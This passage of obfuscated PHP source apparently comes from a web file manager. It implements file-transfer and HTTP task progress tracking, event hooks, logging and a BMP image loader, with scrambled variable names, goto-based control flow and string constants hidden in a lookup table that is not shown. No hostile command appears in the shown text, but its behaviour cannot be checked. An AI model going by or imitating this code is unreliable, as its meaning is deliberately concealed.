$_SERVER[…Ò×–]; if (!$aö¸œÜÊ„“) { return Model($E¤¼÷‡ëä[403])->where(array($E¤¼÷‡ëä[89] => $BÚò©ÖÇœÈ, $E¤¼÷‡ëä[29] => $E¤¼÷‡ëä[1471]))->delete(); } $a—¼ï‡×¼ = json_encode($aö¸œÜÊ„“); goto C÷‹ÏÎé; C÷‹ÏÎé: if (!$a—¼ï‡×¼) { ob_start(); var_dump($aö¸œÜÊ„“); $EİŠŞà½â“ = ob_get_clean(); self::log($E¤¼÷‡ëä[1472] . json_encode_force($EİŠŞà½â“)); } if (!$BÚò©ÖÇœÈ || !$aö¸œÜÊ„“[$E¤¼÷‡ëä[371]]) { return !1; } $fî†•Â®Âæ = array($E¤¼÷‡ëä[29] => $E¤¼÷‡ëä[1471], $E¤¼÷‡ëä[1450] => USER_ID, $E¤¼÷‡ëä[89] => $BÚò©ÖÇœÈ, $E¤¼÷‡ëä[363] => $a—¼ï‡×¼); goto eíœµ›»ã¸; b×¹öÈ¸¿Ş: } public static function log($cß®Š­¸„‡) { write_log($cß®Š­¸„‡, $_SERVER[…Ò×–][1473]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Ağ«“Ê”»; B“×Şøî‰×: $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1493]] = LNG($Eô¯‹Ñ¬†[1494]); $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1495]] = 0; $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1496]] = 0; goto D÷ÛÎÁ›Ä; cÜÖòâÙ¥¶: Hook::bind($Eô¯‹Ñ¬†[547], array($this, $Eô¯‹Ñ¬†[1482])); Hook::bind($Eô¯‹Ñ¬†[514], array($this, $Eô¯‹Ñ¬†[1483])); Hook::bind($Eô¯‹Ñ¬†[511], array($this, $Eô¯‹Ñ¬†[1483])); goto eÅŸø§ÆÅ; b‰ËÌ©Ş£‡: $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1499]] = 0; $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1500]] = 0; if (!$aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1354]]) { $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1354]] = LNG($Eô¯‹Ñ¬†[1501]); } goto FÑº¦ÀÅê÷; D÷ÛÎÁ›Ä: $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[985]] = $Eô¯‹Ñ¬†[33]; $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1497]] = $Eô¯‹Ñ¬†[33]; $aöÃÌá±÷Ô[$Eô¯‹Ñ¬†[1498]] = 0; goto b‰ËÌ©Ş£‡; E‚”ëÍŸ¸â: Hook::bind($Eô¯‹Ñ¬†[543], array($this, $Eô¯‹Ñ¬†[1480])); Hook::bind($Eô¯‹Ñ¬†[544], array($this, $Eô¯‹Ñ¬†[1481])); Hook::bind($Eô¯‹Ñ¬†[546], array($this, $Eô¯‹Ñ¬†[1482])); goto cÜÖòâÙ¥¶; fì„£˜œ÷”: Hook::bind($Eô¯‹Ñ¬†[1484], array($this, $Eô¯‹Ñ¬†[1485])); Hook::bind($Eô¯‹Ñ¬†[536], array($this, $Eô¯‹Ñ¬†[1486])); $this->sourceModelCopyFlag = !1; goto C‡Ó‘Õ¨øÏ; a­Ğê…İ¿ö: Hook::bind($Eô¯‹Ñ¬†[1474], array($this, $Eô¯‹Ñ¬†[1475])); Hook::bind($Eô¯‹Ñ¬†[1476], array($this, $Eô¯‹Ñ¬†[1477])); Hook::bind($Eô¯‹Ñ¬†[1478], array($this, $Eô¯‹Ñ¬†[1479])); goto E‚”ëÍŸ¸â; Ağ«“Ê”»: $Eô¯‹Ñ¬† =& $_SERVER[…Ò×–]; $aöÃÌá±÷Ô =& $this->task; $this->sourceCopyFolder = !1; goto a­Ğê…İ¿ö; C‡Ó‘Õ¨øÏ: Hook::bind($Eô¯‹Ñ¬†[1487], array($this, $Eô¯‹Ñ¬†[1488])); Hook::bind($Eô¯‹Ñ¬†[1489], array($this, $Eô¯‹Ñ¬†[1490])); Hook::bind($Eô¯‹Ñ¬†[1491], array($this, $Eô¯‹Ñ¬†[1492])); goto B“×Şøî‰×; eÅŸø§ÆÅ: Hook::bind($Eô¯‹Ñ¬†[516], array($this, $Eô¯‹Ñ¬†[1483])); Hook::bind($Eô¯‹Ñ¬†[518], array($this, $Eô¯‹Ñ¬†[1483])); Hook::bind($Eô¯‹Ñ¬†[520], array($this, $Eô¯‹Ñ¬†[1483])); goto fì„£˜œ÷”; FÑº¦ÀÅê÷: } protected function endAfter() { goto fÏéŒ¬˜Õò; Cñªë²‘É‹: Hook::unbind($b¸Ì‘æ«ÉŒ[520], array($this, $b¸Ì‘æ«ÉŒ[1483])); Hook::unbind($b¸Ì‘æ«ÉŒ[1484], array($this, $b¸Ì‘æ«ÉŒ[1485])); Hook::unbind($b¸Ì‘æ«ÉŒ[536], array($this, $b¸Ì‘æ«ÉŒ[1486])); goto B„±Ÿ±ø´; B„±Ÿ±ø´: Hook::unbind($b¸Ì‘æ«ÉŒ[1487], array($this, $b¸Ì‘æ«ÉŒ[1488])); Hook::unbind($b¸Ì‘æ«ÉŒ[1489], array($this, $b¸Ì‘æ«ÉŒ[1490])); Hook::unbind($b¸Ì‘æ«ÉŒ[1491], array($this, $b¸Ì‘æ«ÉŒ[1492])); goto d‚˜ñ¢ª’®; EÁêò·“ˆ‚: Hook::unbind($b¸Ì‘æ«ÉŒ[511], array($this, $b¸Ì‘æ«ÉŒ[1483])); Hook::unbind($b¸Ì‘æ«ÉŒ[516], array($this, $b¸Ì‘æ«ÉŒ[1483])); Hook::unbind($b¸Ì‘æ«ÉŒ[518], array($this, $b¸Ì‘æ«ÉŒ[1483])); goto Cñªë²‘É‹; fÏéŒ¬˜Õò: $b¸Ì‘æ«ÉŒ =& $_SERVER[…Ò×–]; Hook::unbind($b¸Ì‘æ«ÉŒ[1474], array($this, $b¸Ì‘æ«ÉŒ[1475])); Hook::unbind($b¸Ì‘æ«ÉŒ[1476], array($this, $b¸Ì‘æ«ÉŒ[1477])); goto EÖÎ‘ÛÓæé; d£ÜÁ¤–ğÛ: Hook::unbind($b¸Ì‘æ«ÉŒ[546], array($this, $b¸Ì‘æ«ÉŒ[1482])); Hook::unbind($b¸Ì‘æ«ÉŒ[547], array($this, $b¸Ì‘æ«ÉŒ[1482])); Hook::unbind($b¸Ì‘æ«ÉŒ[514], array($this, $b¸Ì‘æ«ÉŒ[1483])); goto EÁêò·“ˆ‚; EÖÎ‘ÛÓæé: Hook::unbind($b¸Ì‘æ«ÉŒ[1478], array($this, $b¸Ì‘æ«ÉŒ[1479])); Hook::unbind($b¸Ì‘æ«ÉŒ[543], array($this, $b¸Ì‘æ«ÉŒ[1480])); Hook::unbind($b¸Ì‘æ«ÉŒ[544], array($this, $b¸Ì‘æ«ÉŒ[1481])); goto d£ÜÁ¤–ğÛ; d‚˜ñ¢ª’®: } public function copyMoveStart($b¿ÒÆ¹œ„Á, $EÂ—ì‰„‘‚, $C„¸•ÙãÕ, $d¼Æ‚¢ÑÚ) { goto CïÁŸ¾– ’; Dç‘¿Ò¨Â˜: $f§ÓÈœá¸¦[$FÆí…Ãìó¯[1503]] = KodIO::transferType($b¿ÒÆ¹œ„Á, $C„¸•ÙãÕ); $this->update(); goto EÓéÍª•´„; fíÁƒ¼ß: if (substr($EÂ—ì‰„‘‚, 0, strlen($cùæã±Š¤†)) == $cùæã±Š¤†) { return; } if (substr($d¼Æ‚¢ÑÚ, 0, strlen($cùæã±Š¤†)) == $cùæã±Š¤†) { return; } $f§ÓÈœá¸¦ =& $this->task; goto Dç‘¿Ò¨Â˜; CïÁŸ¾– ’: $FÆí…Ãìó¯ =& $_SERVER[…Ò×–]; self::log($FÆí…Ãìó¯[1502] . $EÂ—ì‰„‘‚ . $FÆí…Ãìó¯[66] . $d¼Æ‚¢ÑÚ); $cùæã±Š¤† = rtrim(TEMP_FILES, $FÆí…Ãìó¯[8]); goto fíÁƒ¼ß; EÓéÍª•´„: } public function updateAfter() { goto E¹³¹Ğèæá; d§ÓùÃÏæ¼: $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1451]] = $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1500]] / $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[703]]; if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1451]] > 0) { $d¢°òè¶¢¢ = timeFloat() - $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1453]] - $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1456]]; $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1457]] = $d¢°òè¶¢¢ * (1 - $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1451]]) / $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1451]]; } goto C­’í‘ï™; dæ…Š¶ºæÕ: if ($this->sourceModelCopyFlag) { return; } if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1503]] == $f–í—ÍÜºÂ[1104]) { return; } if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1503]] == $f–í—ÍÜºÂ[1051] || $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1503]] == $f–í—ÍÜºÂ[103]) { if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1497]]) { $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1500]] = $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1499]] + $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1496]]; } } else { if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1503]] == $f–í—ÍÜºÂ[1105]) { if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1497]] == $f–í—ÍÜºÂ[1051]) { $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1500]] = $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1499]] + $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1496]] * 0.5; } else { if ($Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1497]] == $f–í—ÍÜºÂ[103]) { $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1500]] = $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1499]] + $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1495]] * 0.5 + $Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[1496]] * 0.5; } } } } goto d§ÓùÃÏæ¼; E¹³¹Ğèæá: $f–í—ÍÜºÂ =& $_SERVER[…Ò×–]; $Cˆ±¯¶ÛÚ— =& $this->task; if (!$Cˆ±¯¶ÛÚ—[$f–í—ÍÜºÂ[703]]) { return; } goto dæ…Š¶ºæÕ; C­’í‘ï™: } public function addPath($EÅÉƒ—†) { goto Dì¾ÜëÍöº; cÌÒß¸Öí»: $D„‹¤É§ = IO::infoWithChildren($EÅÉƒ—†); $cÓŞñîŒ™ = $C²åóˆÚÑ[$Eµõš½‹¥¤[1504]] ? $C²åóˆÚÑ[$Eµõš½‹¥¤[1504]][$Eµõš½‹¥¤[1505]] : 0; $C²åóˆÚÑ[$Eµõš½‹¥¤[1504]] = array($Eµõš½‹¥¤[1505] => $cÓŞñîŒ™ + 1, $Eµõš½‹¥¤[390] => $D„‹¤É§[$Eµõš½‹¥¤[28]], $Eµõš½‹¥¤[75] => $D„‹¤É§[$Eµõš½‹¥¤[75]], $Eµõš½‹¥¤[471] => $D„‹¤É§[$Eµõš½‹¥¤[471]] ? $D„‹¤É§[$Eµõš½‹¥¤[471]] : $D„‹¤É§[$Eµõš½‹¥¤[75]]); goto eë¦®İÙ; Dì¾ÜëÍöº: $Eµõš½‹¥¤ =& $_SERVER[…Ò×–]; if (!$EÅÉƒ—†) { return; } $C²åóˆÚÑ =& $this->task; goto cÌÒß¸Öí»; eë¦®İÙ: if ($D„‹¤É§[$Eµõš½‹¥¤[29]] == $Eµõš½‹¥¤[171]) { $C²åóˆÚÑ[$Eµõš½‹¥¤[983]] += 1; } else { $C²åóˆÚÑ[$Eµõš½‹¥¤[983]] += $D„‹¤É§[$Eµõš½‹¥¤[80]][$Eµõš½‹¥¤[78]]; if ($D„‹¤É§[$Eµõš½‹¥¤[373]]) { $C²åóˆÚÑ[$Eµõš½‹¥¤[983]] += $D„‹¤É§[$Eµõš½‹¥¤[80]][$Eµõš½‹¥¤[79]] + 1; } } $C²åóˆÚÑ[$Eµõš½‹¥¤[703]] += $D„‹¤É§[$Eµõš½‹¥¤[77]]; $this->update(); goto e§”ìëïŠÁ; e§”ìëïŠÁ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($AÚ½ˆ‹´) { $DÂœÈÉ¤Ù¾ =& $_SERVER[…Ò×–]; $cŞ³âõÙµ =& $this->task; $cŞ³âõÙµ[$DÂœÈÉ¤Ù¾[1493]] = $AÚ½ˆ‹´[$DÂœÈÉ¤Ù¾[28]]; $cŞ³âõÙµ[$DÂœÈÉ¤Ù¾[985]] = $AÚ½ˆ‹´[$DÂœÈÉ¤Ù¾[28]]; $this->update(); } public function copyFileStart($dÛÅÏ…¨’Ú, $cªÊºÆ«†¯, $D»¶“Ó¢îÛ, $A‹çù•Ôé, $c È¸¾¬ˆó, $Bñì»¨÷) { goto bµÏõù Õ¾; DÂ¥ËÊæçä: $AÎˆœœá†¦[$E’‚Ö‹Ÿµ[1493]] = $eñœÅŒ–­; $AÎˆœœá†¦[$E’‚Ö‹Ÿµ[1495]] = (int) $dÛÅÏ…¨’Ú->size($cªÊºÆ«†¯); $AÎˆœœá†¦[$E’‚Ö‹Ÿµ[1496]] = 0; goto Aò´àùŒ©Ì; Aò´àùŒ©Ì: $AÎˆœœá†¦[$E’‚Ö‹Ÿµ[985]] = $E’‚Ö‹Ÿµ[33]; $AÎˆœœá†¦[$E’‚Ö‹Ÿµ[1497]] = $E’‚Ö‹Ÿµ[33]; $AÎˆœœá†¦[$E’‚Ö‹Ÿµ[1498]] = 0; goto b°‚‹µñİ; b°‚‹µñİ: $this->update(); goto c¼ÁÖÌˆîÀ; bµÏõù Õ¾: $E’‚Ö‹Ÿµ =& $_SERVER[…Ò×–]; $eñœÅŒ–­ = $c È¸¾¬ˆó; if ($eñœÅŒ–­ == $GLOBALS[$E’‚Ö‹Ÿµ[1506]]) { $eñœÅŒ–­ = $GLOBALS[$E’‚Ö‹Ÿµ[1507]]; } goto Fˆà–¾ÄÈ; Fˆà–¾ÄÈ: $GLOBALS[$E’‚Ö‹Ÿµ[1507]] = $c È¸¾¬ˆó; $GLOBALS[$E’‚Ö‹Ÿµ[1506]] = $Bñì»¨÷; $AÎˆœœá†¦ =& $this->task; goto DÂ¥ËÊæçä; c¼ÁÖÌˆîÀ: } public function copyFileEnd($b˜ÚºôŸˆ‘, $E÷ÑåÙ’Ğê, $bÙìŞ¨Ä, $b„â‘Õ…ö, $C±çÛ£‡•ò, $dãÊ’Â‘“) { $d®í¼¦´‹Æ =& $_SERVER[…Ò×–]; $C–ƒôÌËê¬ =& $this->task; $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1496]] = $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1495]]; $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1497]] = $d®í¼¦´‹Æ[33]; if ($C±çÛ£‡•ò == $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1493]]) { $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1499]] += $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1495]]; $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1500]] = $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1499]]; $this->update(1); } else { $this->update(); $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1496]] = 0; } self::log($d®í¼¦´‹Æ[1508] . $E÷ÑåÙ’Ğê . $d®í¼¦´‹Æ[66] . $b„â‘Õ…ö . $d®í¼¦´‹Æ[221] . $C±çÛ£‡•ò . $d®í¼¦´‹Æ[1509] . $C–ƒôÌËê¬[$d®í¼¦´‹Æ[1493]]); } public function updateFileEnd($AÊõœ…éœ‰, $fÔ“‘¹Ù®²) { goto b„ÂÔÚÕÏÒ; b„ÂÔÚÕÏÒ: $A¯¿ ÕÑáï =& $_SERVER[…Ò×–]; $c…ÈôÒ³¸ç =& $this->task; $c…ÈôÒ³¸ç[$A¯¿ ÕÑáï[1493]] = $AÊõœ…éœ‰; goto cƒáØÉæô; E˜¨£íƒ¨: $this->update(1); self::log($A¯¿ ÕÑáï[1510] . $AÊõœ…éœ‰); goto a‰•à¯»Ş; cƒáØÉæô: $c…ÈôÒ³¸ç[$A¯¿ ÕÑáï[1495]] = $fÔ“‘¹Ù®²; $c…ÈôÒ³¸ç[$A¯¿ ÕÑáï[1499]] += $fÔ“‘¹Ù®²; $c…ÈôÒ³¸ç[$A¯¿ ÕÑáï[1500]] = $c…ÈôÒ³¸ç[$A¯¿ ÕÑáï[1499]]; goto E˜¨£íƒ¨; a‰•à¯»Ş: } public function sourceModelCopy($E¤É¬¶ºƒã) { goto dœšŞÅçö; F›æºÁõ‡: $a¼ŒÔáù÷™ =& $this->task; $this->sourceModelCopyFlag = !0; $f‰óÃˆß = 0; goto bËˆâŞ†‚‡; dœšŞÅçö: $eß¤Ç‰ìÎ =& $_SERVER[…Ò×–]; $FÈ–‘œÊœè = $E¤É¬¶ºƒã[0]; $eƒÍğä‚ô = $E¤É¬¶ºƒã[1]; goto F›æºÁõ‡; bËˆâŞ†‚‡: switch ($FÈ–‘œÊœè) { case $eß¤Ç‰ìÎ[512]: $f‰óÃˆß = 1; break; case $eß¤Ç‰ìÎ[515]: $a¼ŒÔáù÷™[$eß¤Ç‰ìÎ[1493]] = $eƒÍğä‚ô[$eß¤Ç‰ìÎ[28]]; break; case $eß¤Ç‰ìÎ[517]: $f‰óÃˆß = intval($E¤É¬¶ºƒã[$eß¤Ç‰ìÎ[367]] * 0.4); break; case $eß¤Ç‰ìÎ[519]: $f‰óÃˆß = intval($E¤É¬¶ºƒã[$eß¤Ç‰ìÎ[367]] * 0.2); break; case $eß¤Ç‰ìÎ[521]: $f‰óÃˆß = intval($E¤É¬¶ºƒã[$eß¤Ç‰ìÎ[367]] * 0.4); break; } $this->update($f‰óÃˆß); $this->sourceModelCopyFlag = !1; goto cë‘Èß“ ; cë‘Èß“ : } public function sourceRemove($C«Œ†î¼³, $f¯ªóˆª÷) { $d†¡øÒ¦Í˜ =& $_SERVER[…Ò×–]; $this->sourceModelCopyFlag = !0; $açÖŞã®íª = 1; if (isset($C«Œ†î¼³[$d†¡øÒ¦Í˜[80]])) { $açÖŞã®íª = $C«Œ†î¼³[$d†¡øÒ¦Í˜[80]][$d†¡øÒ¦Í˜[78]] + $C«Œ†î¼³[$d†¡øÒ¦Í˜[80]][$d†¡øÒ¦Í˜[79]] + 1; } $this->update($açÖŞã®íª); $this->sourceModelCopyFlag = !1; } public function sourceMove($fÀ¨³à¥ƒ») { $this->sourceRemove($fÀ¨³à¥ƒ», !1); } public function curlProgress($aÕáµÙœÈÄ, $eĞÓ…­•ˆ, $cŞ·Ç£Ö…, $B‹á˜À²¬Ç, $fñÙÏ­¶×Ä) { $C·Ğñ¹šÈ =& $_SERVER[…Ò×–]; $D–İĞ˜ß… =& $this->task; if ($fñÙÏ­¶×Ä > 0) { $D–İĞ˜ß…[$C·Ğñ¹šÈ[985]] = $C·Ğñ¹šÈ[1511]; $D–İĞ˜ß…[$C·Ğñ¹šÈ[1497]] = $C·Ğñ¹šÈ[103]; if ($D–İĞ˜ß…[$C·Ğñ¹šÈ[1495]] == $B‹á˜À²¬Ç || $B‹á˜À²¬Ç > 1024 * 1024) { $D–İĞ˜ß…[$C·Ğñ¹šÈ[1496]] = $fñÙÏ­¶×Ä; } if ($D–İĞ˜ß…[$C·Ğñ¹šÈ[1498]]) { $D–İĞ˜ß…[$C·Ğñ¹šÈ[1496]] = $fñÙÏ­¶×Ä + $D–İĞ˜ß…[$C·Ğñ¹šÈ[1498]]; } } else { if ($cŞ·Ç£Ö… > 0) { if ($D–İĞ˜ß…[$C·Ğñ¹šÈ[1495]] == $eĞÓ…­•ˆ) { $D–İĞ˜ß…[$C·Ğñ¹šÈ[1496]] = $cŞ·Ç£Ö…; $D–İĞ˜ß…[$C·Ğñ¹šÈ[985]] = $C·Ğñ¹šÈ[1512]; $D–İĞ˜ß…[$C·Ğñ¹šÈ[1497]] = $C·Ğñ¹šÈ[1051]; } } } $this->update(); } public function curlProgressStart($EÍàõ‡¨ª) { } public function curlProgressEnd($açÓÓ°—İ) { $eš‚²£Æñ =& $_SERVER[…Ò×–]; $b‹Š§Ş±™ =& $this->task; $dÒ‚é†Ä¦ = curl_getinfo($açÓÓ°—İ); $cˆâªÊŸç‘ = $dÒ‚é†Ä¦[$eš‚²£Æñ[1513]]; if ($b‹Š§Ş±™[$eš‚²£Æñ[1497]] == $eš‚²£Æñ[103] && $cˆâªÊŸç‘) { $b‹Š§Ş±™[$eš‚²£Æñ[1498]] += $cˆâªÊŸç‘; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $cê®¬³óï =& $_SERVER[…Ò×–]; $Fëó²„«ÂŠ =& $this->task; $Fëó²„«ÂŠ[$cê®¬³óï[1514]] = 1; Hook::bind($cê®¬³óï[1487], array($this, $cê®¬³óï[1515])); Hook::bind($cê®¬³óï[1489], array($this, $cê®¬³óï[1516])); Hook::bind($cê®¬³óï[1491], array($this, $cê®¬³óï[1517])); } protected function endAfter() { $A©°É¢ÄÓÎ =& $_SERVER[…Ò×–]; Hook::unbind($A©°É¢ÄÓÎ[1487], array($this, $A©°É¢ÄÓÎ[1515])); Hook::unbind($A©°É¢ÄÓÎ[1489], array($this, $A©°É¢ÄÓÎ[1516])); Hook::unbind($A©°É¢ÄÓÎ[1491], array($this, $A©°É¢ÄÓÎ[1517])); } public function progressStart($eµĞÒù½õ½) { $cªÆßÏ‰‚Ë =& $_SERVER[…Ò×–]; $DÃŒ‡¨¥µÏ = curl_getinfo($eµĞÒù½õ½); self::log($cªÆßÏ‰‚Ë[1518] . $DÃŒ‡¨¥µÏ[$cªÆßÏ‰‚Ë[299]]); self::valueSet($this->task[$cªÆßÏ‰‚Ë[371]], $this->task); } public function progressEnd($Ešõ„˜¬Ş) { $dåÑœéÔ÷ =& $_SERVER[…Ò×–]; self::log($dåÑœéÔ÷[1519] . $this->task[$dåÑœéÔ÷[371]]); $this->end(); } public function progress($f«õ²â¦•, $BŒ§øçƒ™, $Fï­¿¾É¬, $E˜ ÏÏ‚¸, $d£­„öÉé) { $E£íÖÀ®†‰ =& $_SERVER[…Ò×–]; $D°¯ó¡¯Ùé =& $this->task; if ($d£­„öÉé > 0) { $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[983]] = $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[983]] == 0 ? $E˜ ÏÏ‚¸ : $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[983]]; $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[997]] = $d£­„öÉé; } else { if ($Fï­¿¾É¬ > 0) { $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[983]] = $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[983]] == 0 ? $BŒ§øçƒ™ : $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[983]]; $D°¯ó¡¯Ùé[$E£íÖÀ®†‰[997]] = $Fï­¿¾É¬; } } $this->update(); self::log("\x70\162\x6f\x67\162\145\x73\163\110\x74\x74\160\72\x64\157\167\x6e\x3a{$Fï­¿¾É¬}\x2f{$BŒ§øçƒ™}\73\40\x75\x70\154\x6f\141\x64\x3a{$d£­„öÉé}\x2f{$E˜ ÏÏ‚¸}\x3b"); } } goto Cœ¼ä†Îâ¥; còï½±Œ††: class ImageGdBMP { public static function load($cÂÅÀ²èŸ­) { $B´ˆ áÆ± = fopen($cÂÅÀ²èŸ­, $_SERVER[…Ò×–][1534]); if ($B´ˆ áÆ± === !1) { return !1; } $e˜öÜ°‡¿ = self::loadFromStream($B´ˆ áÆ±); fclose($B´ˆ áÆ±); return $e˜öÜ°‡¿; } public static function loadFromStream($F‚¸çÄ‹Ï) { $d×“ƒ ä® =& $_SERVER[…Ò×–]; $d‹Ğ¯ÈŒ˜Š = fread($F‚¸çÄ‹Ï, 14); if ($d‹Ğ¯ÈŒ˜Š === !1) { return !1; } if ($d‹Ğ¯ÈŒ˜Š[0] != $d×“ƒ ä®[1844] || $d‹Ğ¯ÈŒ˜Š[1] != $d×“ƒ ä®[1845]) { return !1; } $d¼§È©ÁÕ÷ = unpack($d×“ƒ ä®[1846] . $d×“ƒ ä®[1847] . $d×“ƒ ä®[1848] . $d×“ƒ ä®[1849] . $d×“ƒ ä®[1850], $d‹Ğ¯ÈŒ˜Š); return self::loadFromStreamAndFileHeader($F‚¸çÄ‹Ï, $d¼§È©ÁÕ÷); } public static function loadFromStreamAndFileHeader($f²²ñÂÌ‚¤, array $f°¾¨’¶Æµ) { goto C»¼šãÁ; eˆ’›¹å‰Ê: if ($f¬¯ê«¬éÈ == 0 || $AíËê¶‚â == 0 || $A—¨·éĞ§Å != 1 || ($fòÓŒ‰Æ‰ & $DåìÑÄ©Úå) != 0 || ($fòÓŒ‰Æ‰ & $CŠ†ÈŒ‹ˆ) != 0 || ($fòÓŒ‰Æ‰ & $BÛºìĞä±º) != 0 || ($DåìÑÄ©Úå & $CŠ†ÈŒ‹ˆ) != 0 || ($DåìÑÄ©Úå & $BÛºìĞä±º) != 0 || ($CŠ†ÈŒ‹ˆ & $BÛºìĞä±º) != 0) { return !1; } if ($Dİ®İÁ¤â¼ == 4 || $Dİ®İÁ¤â¼ == 5) { $BäË…¿ù„» = stream_get_contents($f²²ñÂÌ‚¤, $d½áêçŸŠŸ); if ($BäË…¿ù„» === !1) { return !1; } return imagecreatefromstring($BäË…¿ù„»); } $fÛ—Ç¯«Œ = $f¬¯ê«¬éÈ * $få˜öŸÑòî + 31 >> 3 & ~3; goto fÄÛ™¢†Ù; C»¼šãÁ: $CğİÆ†±‘… =& $_SERVER[…Ò×–]; if ($f°¾¨’¶Æµ[$CğİÆ†±‘…[392]] != 19778) { return !1; } $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, 4); goto Aõ™à¬ÔÒ‘; Aõ™à¬ÔÒ‘: if ($BäË…¿ù„» === !1) { return !1; } list(, $fˆ¨Ú¬„Ş) = unpack($CğİÆ†±‘…[1851], $BäË…¿ù„»); if ($fˆ¨Ú¬„Ş == 12) { goto DŞ°¥ôÌ÷; dÚçæœÅö‚: $BÛºìĞä±º = 255; goto CİÓ‡ÜÀÔ¹; c£ä¶ø³„±: $Eè©³±ò§ = $AË•Ä¹®Ú = $fòÓŒ‰Æ‰ = $Dİ®İÁ¤â¼ = 0; $DåìÑÄ©Úå = 16711680; $CŠ†ÈŒ‹ˆ = 65280; goto dÚçæœÅö‚; DŞ°¥ôÌ÷: $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, $fˆ¨Ú¬„Ş - 4); if ($BäË…¿ù„» === !1) { return !1; } extract(unpack($CğİÆ†±‘…[1852] . $CğİÆ†±‘…[1853] . $CğİÆ†±‘…[1854] . $CğİÆ†±‘…[1855], $BäË…¿ù„»)); goto c£ä¶ø³„±; CİÓ‡ÜÀÔ¹: } else { if (124 < $fˆ¨Ú¬„Ş || $fˆ¨Ú¬„Ş < 40) { return !1; } else { goto aäõÑçƒƒ; E¦Ã½à„¨æ: if ($c¯öˆàø÷ & 2147483648) { $c¯öˆàø÷ = -(~$c¯öˆàø÷ & 4294967295) - 1; } if ($f°¾¨’¶Æµ[$CğİÆ†±‘…[525]] != 0) { $f¤Å»ŞÔ™’ = $få˜öŸÑòî == 1 || $få˜öŸÑòî == 4 || $få˜öŸÑòî == 8 ? ($Eè©³±ò§ ? $Eè©³±ò§ : pow(2, $få˜öŸÑòî)) << 2 : 0; $fºÃª¨¸İ = $d½áêçŸŠŸ ? $d½áêçŸŠŸ : ($f¬¯ê«¬éÈ * $få˜öŸÑòî + 31 >> 3 & ~3) * abs($AíËê¶‚â); $Dœß­¨ÅÆ = $f°¾¨’¶Æµ[$CğİÆ†±‘…[525]] - $fºÃª¨¸İ - $f¤Å»ŞÔ™’ - 14; if ($fˆ¨Ú¬„Ş < $Dœß­¨ÅÆ && 40 <= $fˆ¨Ú¬„Ş && $fˆ¨Ú¬„Ş <= 124) { $fˆ¨Ú¬„Ş = $Dœß­¨ÅÆ; } } if ($fˆ¨Ú¬„Ş - 40 > 0) { $BäË…¿ù„» = fread($f²²ñÂÌ‚¤, $fˆ¨Ú¬„Ş - 40); if ($BäË…¿ù„» === !1) { return !1; } extract(unpack($CğİÆ†±‘…[1865] . $CğİÆ†±‘…[1866] . $CğİÆ†±‘…[1867] . $CğİÆ†±‘…[1868], $BäË…¿ù„» . str_repeat($CğİÆ†±‘…[1869], 120))); } else { $fòÓŒ‰Æ‰ = $DåìÑÄ©Úå = $CŠ†ÈŒ‹ˆ = $BÛºìĞä±º = 0; } goto AšÅ¬ëƒÎ; B´¹È¥Ä¿Œ: if ($f¬¯ê«¬éÈ & 2147483648) { $f¬¯ê«¬éÈ = -(~$f¬¯ê«¬éÈ & 4294967295) - 1; } if ($AíËê¶‚â & 2147483648) { $AíËê¶‚â = -(~$AíËê¶‚â & 4294967295) - 1; } if ($d™‹ñĞÌ…¿ & 2147483648) { 